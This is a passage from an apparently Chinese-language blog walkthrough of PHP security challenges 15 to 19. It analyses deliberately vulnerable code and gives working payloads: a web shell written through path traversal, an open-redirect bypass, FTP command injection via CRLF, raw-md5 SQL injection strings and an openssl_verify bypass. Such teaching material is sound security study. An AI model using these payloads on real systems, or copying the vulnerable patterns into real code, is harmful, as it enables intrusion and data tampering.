class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// print_r(var_export(get_object_vars($this), true));   </span></span><br><span class="line"><span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'id'</span> =&gt; <span class="string">'../../var/www/html/shell.php'</span>,</span><br><span class="line">  <span class="string">'lost'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">  <span class="string">'bought'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">  <span class="string">'t'</span> =&gt; <span class="string">'&lt;?php eval($_GET[1])?&gt;'</span>,</span><br><span class="line">)</span><br><span class="line">    </span><br><span class="line"><span class="comment">// echo self::EXTERNAL_DIRECTORY . $this-&gt;id;</span></span><br><span class="line">/tmp/../../<span class="keyword">var</span>/www/html/test/shell.php</span><br></pre></td></tr></table></figure><p><strong>变一变</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;$field = $count++;  -–&gt;  <span class="keyword">$this</span>-&gt;$field = ++$count;</span><br></pre></td></tr></table></figure><p>php 有个很有意思的特性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $s = <span class="string">'1'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> ++$s;  <span class="comment">// 2</span></span><br><span class="line">php &gt; $s = <span class="string">'a'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> ++$s;  <span class="comment">// b</span></span><br><span class="line">php &gt; $s = <span class="string">'abc'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> ++$s;  <span class="comment">// abd</span></span><br></pre></td></tr></table></figure><p>这时候只需要稍微改下即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=../../<span class="keyword">var</span>/www/html/shell.pho&amp;t=<span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="15-Sleigh-Ride"><a href="#15-Sleigh-Ride" class="headerlink" title="15 - Sleigh Ride"></a>15 - Sleigh Ride</h2><blockquote><p>$_SERVER[‘PHP_SELF’]</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $websiteHost = <span class="string">'www.example.com'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">        $url = urldecode($url);</span><br><span class="line">        header(<span class="string">"Location: $url"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">        $parts = explode(<span class="string">'/'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">        $baseFile = end($parts);</span><br><span class="line">        $url = sprintf(</span><br><span class="line">            <span class="string">"%s?%s"</span>,</span><br><span class="line">            $baseFile,</span><br><span class="line">            http_build_query($params)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setHeaders($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'redirect'</span>]) &#123;</span><br><span class="line">    (<span class="keyword">new</span> Redirect())-&gt;startRedirect($_GET[<span class="string">'params'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>粗一看，有一个 <code>Redirect</code> 的类，很有可能是任意 <code>URL</code> 跳转。</p><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'PHP_SELF'</span>]  <span class="comment">// 当前执行脚本的文件名</span></span><br><span class="line">http:<span class="comment">//example.com/test.php/foo.bar</span></span><br><span class="line">--&gt; /test.php/foo.bar</span><br><span class="line"></span><br><span class="line">explode ( string $delimiter , string $string [, int $limit ] ) : <span class="keyword">array</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pizza  = <span class="string">"piece1 piece2 piece3 piece4 piece5 piece6"</span>;</span><br><span class="line">$pieces = explode(<span class="string">" "</span>, $pizza);</span><br><span class="line"><span class="keyword">echo</span> $pieces[<span class="number">0</span>]; <span class="comment">// piece1</span></span><br><span class="line"><span class="keyword">echo</span> $pieces[<span class="number">1</span>]; <span class="comment">// piece2    </span></span><br><span class="line"></span><br><span class="line">end ( <span class="keyword">array</span> &amp;$array ) : mixed</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fruits = <span class="keyword">array</span>(<span class="string">'apple'</span>, <span class="string">'banana'</span>, <span class="string">'cranberry'</span>);</span><br><span class="line"><span class="keyword">echo</span> end($fruits); <span class="comment">// cranberry</span></span><br><span class="line"></span><br><span class="line">http_build_query ( mixed $query_data [, string $numeric_prefix [, string $arg_separator [, int $enc_type = PHP_QUERY_RFC1738 ]]] ) : string</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = <span class="keyword">array</span>(<span class="string">'foo'</span>=&gt;<span class="string">'bar'</span>,</span><br><span class="line">              <span class="string">'baz'</span>=&gt;<span class="string">'boom'</span>,</span><br><span class="line">              <span class="string">'cow'</span>=&gt;<span class="string">'milk'</span>,</span><br><span class="line">              <span class="string">'php'</span>=&gt;<span class="string">'hypertext processor'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> http_build_query($data) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// foo=bar&amp;baz=boom&amp;cow=milk&amp;php=hypertext+processor</span></span><br><span class="line"><span class="keyword">echo</span> http_build_query($data, <span class="string">''</span>, <span class="string">'&amp;amp;'</span>);    </span><br><span class="line"><span class="comment">// myvar_0=foo&amp;myvar_1=bar&amp;myvar_2=baz&amp;myvar_3=boom&amp;cow=milk&amp;php=hypertext+processor</span></span><br></pre></td></tr></table></figure><p>其本意应该是实现站内跳转，但是没有过滤，所以造成了漏洞。</p><p>此漏洞可被拿来构造钓鱼页面，来进行欺骗；某些依赖 <code>referer</code> 校验的安全解决方案也会失效。</p><p>例如，如果有提交本站 bug 的窗口，还可以结合一些 <code>xss</code> 盲打管理员 <code>cookie</code>。</p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/target.com?redirect=<span class="number">1</span>&amp;params[abc]=<span class="number">123</span></span><br><span class="line">URL --&gt; target.com?abc=<span class="number">123</span>  <span class="comment">// 仍然在站内跳转，需要添加一个 http://</span></span><br><span class="line">前面又是用 / 分割的，如果直接加入将失效，注意到 urldecode()，所以这里可用 url 二次编码绕过</span><br><span class="line"><span class="comment">//  --&gt;  %2f%2f  --&gt; %25%32%66%25%32%66</span></span><br><span class="line">最终 payload  --&gt; index.php/http:%<span class="number">252</span>f%<span class="number">252</span>fbaidu.com?redirect=<span class="number">1</span>&amp;params[abc]=<span class="number">123</span></span><br></pre></td></tr></table></figure><h2 id="16-Poem"><a href="#16-Poem" class="headerlink" title="16 - Poem"></a>16 - Poem</h2><blockquote><p>$_REQUESTS</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host, $port, $user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sock = fsockopen($host, $port);  <span class="comment">// 返回文件指针，文件操作相关函数都能用</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;login($user, $pass);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cleanInput();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mode($_REQUEST[<span class="string">'mode'</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;send($_FILES[<span class="string">'file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $_GET = array_map(<span class="string">'intval'</span>, $_GET);</span><br><span class="line">        $_POST = array_map(<span class="string">'intval'</span>, $_POST);</span><br><span class="line">        $_COOKIE = array_map(<span class="string">'intval'</span>, $_COOKIE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"USER "</span> . $username . <span class="string">"\n"</span>);</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"PASS "</span> . $password . <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span><span class="params">($mode)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($mode == <span class="number">1</span> || $mode == <span class="number">2</span> || $mode == <span class="number">3</span>) &#123;</span><br><span class="line">            fputs(<span class="keyword">$this</span>-&gt;sock, <span class="string">"MODE $mode\n"</span>);  <span class="comment">// fputs 是 fwrite 别名</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        fputs(<span class="keyword">$this</span>-&gt;sock, $data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FTP(<span class="string">'localhost'</span>, <span class="number">21</span>, <span class="string">'user'</span>, <span class="string">'password'</span>);</span><br></pre></td></tr></table></figure><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>给的源码是一个 <code>FTP</code> 操作类，可能又是文件上传。</p><p>不熟悉 <code>fsockopen</code> 的，可以看看 <a href="http://www.manongjc.com/article/1463.html" target="_blank" rel="noopener">php fsockopen使用方法和实例讲解</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为数组每一个元素都应用回调函数，类似 map()</span></span><br><span class="line">array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>这用到了一个很有意思的超级全局变量—— <code>$_REQUEST</code>，开发过程中尽量不要用，我们先看下手册。</p><blockquote><p>默认情况下包含了 <a href="http://php.net/manual/zh/reserved.variables.get.php" target="_blank" rel="noopener">$_GET</a>，<a href="http://php.net/manual/zh/reserved.variables.post.php" target="_blank" rel="noopener">$_POST</a> 和 <a href="http://php.net/manual/zh/reserved.variables.cookies.php" target="_blank" rel="noopener">$_COOKIE</a> 的数组。</p><p>由于 $_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件，因此可以被远程用户篡改而并不可信。这个数组的项目及其顺序依赖于 PHP 的 <a href="http://php.net/manual/zh/ini.core.php#ini.variables-order" target="_blank" rel="noopener">variables_order</a> 指令的配置。</p></blockquote><p>为什么会说不可信呢？<code>$_REQUEST</code> 是直接从 <code>GET, POST, COOKIE</code> 中取值，而不是引用。也就是说，即使<code>GET, POST, COOKIE</code> 的值在后续发生了变化，也不会影响到 <code>$_REQUEST</code> 中的值，相当于复制了一份最初的值。</p><p>而上面的 <code>cleanInput()</code> 只是将 <code>GET, POST, COOKIE</code> 处理了一下，但是  <code>$_REQUEST</code> 依然不会受影响。</p><p><strong>做个小实验</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET = array_map(<span class="string">'intval'</span>, $_GET);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// ?hhh=123test 结果如下</span></span><br><span class="line">print_r($_GET);</span><br><span class="line">print_r($_REQUEST);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array (</span></span><br><span class="line"><span class="comment">    [hhh] =&gt; 123</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">Array (</span></span><br><span class="line"><span class="comment">    [hhh] =&gt; 123test</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>还有一个小点，这里用的是 <code>==</code> ，会自动进行类型转换，所以轻松绕过，安全编码问题。</p><p><code>fwrite()</code> 能不能进行文件写入？<code>ftp</code> 协议还能进行哪些骚操作？</p><p>带着这两个问题再做做实验，不过这遇到了一个新问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fwrite ( resource $handle , string $string [, int $length ] ) : int</span><br><span class="line">fputs(<span class="keyword">$this</span>-&gt;sock, $data);  </span><br><span class="line"><span class="comment">// 传入的 $data 应该为 string 类型，但这里传的是数组，能行？</span></span><br><span class="line"><span class="comment">// 经过实验，传数组进去的后果就是什么也写不进去，感兴趣的同学可以自己试试。</span></span><br><span class="line"><span class="comment">// 所以传入的 $_FILES['file'] 本意是啥？</span></span><br><span class="line"><span class="comment">// 另外 ftp mode 有 1、2、3？</span></span><br></pre></td></tr></table></figure><p>先开启 <code>nc</code> 进行监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvvkp 8080</span><br></pre></td></tr></table></figure><p>上面的 <code>$_FILES[&#39;file&#39;]</code> 没多大意义，传不过去，所以表单也省了，直接在浏览器发起请求。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1bj3upo1vj20ms08t74v.jpg" alt></p><p>可以看到 <code>mode</code> 那成功绕过，但是绕过了又能干啥呢？</p><p>答案是任意 <code>ftp</code> 指令执行，只需要加个 <code>%0a</code> 换行和 <code>%0d</code> 回车即可实现命令（ftp）注入。</p><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><p>我们先来看看 <code>ftp</code> 常用指令 <a href="https://blog.csdn.net/weiyuefei/article/details/51758288" target="_blank" rel="noopener">ftp协议指令集</a>  <a href="https://www.cnblogs.com/duanxz/p/5129153.html" target="_blank" rel="noopener">ftp协议详解</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">!               cr              macdef         <span class="built_in"> proxy </span>          send</span><br><span class="line">$               delete          mdelete         sendport        status</span><br><span class="line">account         <span class="builtin-name">debug</span>           mdir            put             struct</span><br><span class="line">append          dir             mget            pwd             sunique</span><br><span class="line">ascii           disconnect      mkdir           quit            tenex</span><br><span class="line">bell            form            mls             quote           trace</span><br><span class="line">binary          <span class="builtin-name">get</span>             mode            recv            type</span><br><span class="line">bye             glob            mput            remotehelp      user</span><br><span class="line">case            hash            nmap            rename          verbose</span><br><span class="line">cd              help            ntrans          reset           ?</span><br><span class="line">cdup           <span class="built_in"> lcd </span>            open            rmdir</span><br><span class="line">close           ls              prompt          runique</span><br></pre></td></tr></table></figure><p>可惜的是没有回显，不能进行下载了，其他的文件处理都能执行。</p><p>去看看官方 <code>wp</code> 对 <code>send()</code> 有何解释，没想到只是简单的讲了可以进行任意文件删除。</p><p>最终类似的 payload 为：<code>1%0a%0dDELETE%20test</code>，其中的 <code>DELETE</code> 可替换为其他指令。</p><h3 id="TODO-加-file-协议或许能上传文件。与-ftp-的主被动模式有关，待深研"><a href="#TODO-加-file-协议或许能上传文件。与-ftp-的主被动模式有关，待深研" class="headerlink" title="TODO: 加 file 协议或许能上传文件。与 ftp 的主被动模式有关，待深研"></a>TODO: 加 file 协议或许能上传文件。与 ftp 的主被动模式有关，待深研</h3><h2 id="17-Mistletoe"><a href="#17-Mistletoe" class="headerlink" title="17 - Mistletoe"></a>17 - Mistletoe</h2><blockquote><p>md5</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $pass = md5(<span class="keyword">$this</span>-&gt;password, <span class="keyword">true</span>);</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">                        -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">                        -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">                        -&gt;where(<span class="string">"password = '$pass' AND user = '$user'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addslashes($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> RealSecureLoginManager(</span><br><span class="line">    $_POST[<span class="string">'user'</span>],</span><br><span class="line">    $_POST[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>有 <code>sql</code> 语句，极有可能是注入题， <code>user</code> 被转义，注意到 <code>md5($this-&gt;passwd, true)</code> ，想起了一个 <a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">注入题</a>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = <span class="keyword">FALSE</span> ] ) : string</span><br><span class="line">raw 为 <span class="keyword">TRUE</span> 时为 <span class="number">16</span> 字符二进制格式，默认为 <span class="number">32</span> 字符十六进制数</span><br></pre></td></tr></table></figure><h3 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h3><blockquote><p>hint: “select * from admin where password=’”.md5($pass,true).”‘“</p><p>参考 <a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="noopener">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p>​         <a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">http://www.am0s.com/functions/204.html</a></p><p>有个牛逼的字符串： ffifdyop，传入之后，最终的 sql 语句变为 </p><p>select * from admin where password=’’or’6�]��!r,��b’ 成功闭合，得到万能密码</p></blockquote><p>这还有一个有趣的数字——<code>128</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ php -r "var_dump(md5(128, true));"</span><br><span class="line">string(16) "v�an���l���q��\"</span><br></pre></td></tr></table></figure><p>可以看到末尾出现了一个 <code>\</code> ，将把 <code>‘</code> 吃掉，再结合一下 <code>user= or 1#</code></p><p>最终将形成这样的语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where password='v�an���l���q��\' AND user = ' or 1<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="18-Sign"><a href="#18-Sign" class="headerlink" title="18 - Sign"></a>18 - Sign</h2><blockquote><p>openssl_verify</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span><span class="params">($data, $signature)</span> </span>&#123;</span><br><span class="line">        $pub = openssl_pkey_get_public(<span class="string">"file://pub_key.pem"</span>);</span><br><span class="line">        $signature = base64_decode($signature);</span><br><span class="line">        <span class="keyword">if</span> (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">            $object = json_decode(base64_decode($data));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loginAsUser($object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> JWT())-&gt;verifyToken($_GET[<span class="string">'d'</span>], $_GET[<span class="string">'s'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>又是登录验证，先看一下这两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl_pkey_get_public ( mixed $certificate ) : resource</span><br><span class="line"><span class="comment">// 从 certificate 中解析公钥，供其他函数使用</span></span><br><span class="line">    </span><br><span class="line">openssl_verify ( string $data , string $signature , mixed $pub_key_id [, mixed $signature_alg = OPENSSL_ALGO_SHA1 ] ) : int</span><br><span class="line"><span class="comment">// 使用与 pub_key_id 关联的公钥验证指定数据 data 的签名 signature 是否正确</span></span><br></pre></td></tr></table></figure><p>一个好好的公钥验证函数会有什么漏洞呢？先看另一个很有意思的点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">1</span>) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'hhh&lt;br&gt;'</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'jjj'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出结果：hhh jjj 都有</span></span><br><span class="line"><span class="comment">// 有人可能以为大于 0 才能过 if，然而非 0 即可</span></span><br></pre></td></tr></table></figure><p>手册上面的解释</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1btq7d85ej20nj0hxt9y.jpg" alt></p><p>再回到 <code>openssl_verify()</code> </p><blockquote><p>如果签名正确返回 1, 签名错误返回 0, 内部发生错误则返回-1</p></blockquote><p>所以这里只要构造出内部错误，自然就登录成功了。</p><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><p>想让它出错也比较简单，只需用一个其他的 <code>pub_key.pem</code> 来生成 <code>data</code> 和 <code>signature</code>。</p><h2 id="19-Birch"><a href="#19-Birch" class="headerlink" title="19 - Birch"></a>19 - Birch</h2><blockquote><p>stripcslashes</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageViewer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">"images/$file"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createThumbnail();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createThumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $e = stripcslashes(</span><br><span class="line">            preg_replace(</span><br><span class="line">                <span 